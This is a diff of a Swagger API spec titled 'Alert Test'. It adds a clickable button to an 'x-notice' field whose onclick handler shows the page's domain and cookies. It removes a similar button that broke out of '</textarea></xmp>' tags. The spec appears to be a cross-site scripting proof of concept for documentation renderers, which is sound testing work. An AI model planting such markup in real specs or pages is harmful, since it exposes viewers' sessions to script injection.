@@ -1,17 +1,10 @@
 swagger: '2.0'
 info:
   title: Alert Test
+  x-notice: |
+    <button style="padding:12px 24px; background:#d32f2f; color:white; border:none; border-radius:6px; font-size:16px; cursor:pointer; margin:20px auto; display:block;"
+            onclick="alert('XSS from x-notice!\nDomain: ' + document.domain + '\nCookie: ' + document.cookie)">
+      ⚠️ Important Security Message – Click Here
+    </button>
   version: 1.0.0
-paths:
-  /test:
-    get:
-      summary: Test Endpoint
-      description: |
-        </textarea></xmp>
-        <button style="padding:14px 28px; background:#c62828; color:white; font-weight:bold; border:none; border-radius:8px; cursor:pointer;"
-                onclick="alert(document.domain + '\n' + document.cookie)">
-          Click for Security Verification
-        </button>
-      responses:
-        '200':
-          description: OK
+paths: {}
